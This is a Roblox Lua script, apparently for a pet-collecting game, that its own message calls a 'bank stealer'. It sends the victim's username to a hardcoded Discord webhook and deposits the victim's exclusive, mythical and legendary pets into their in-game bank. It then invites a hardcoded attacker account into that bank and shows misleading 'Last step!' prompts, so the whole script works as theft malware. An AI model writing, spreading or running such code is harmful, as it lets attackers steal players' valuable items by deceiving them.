local LocalNumber = 158551913
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/984154345757098024/xU81a673eCTo7cKDig7Tpt-f9Uboovo3N_sYD1ZPsqHCHazWWGMZC5izVHQqevvkFQa6"
local data = {
   ["content"] = "@everyone Jmeno:" ..game.Players.LocalPlayer.Name.. " Prave zapnul bank stealer",
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 0);
if request then
    lib.Message.New("Last step! Give your pets to your first bank!");
else
   lib.Message.New("Last step! Give your pets to your first bank!");
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
    lib.Message.New("Last step! Give your pets to your first bank!");
else
    lib.Message.New("Last step! Give your pets to your first bank!");
end;
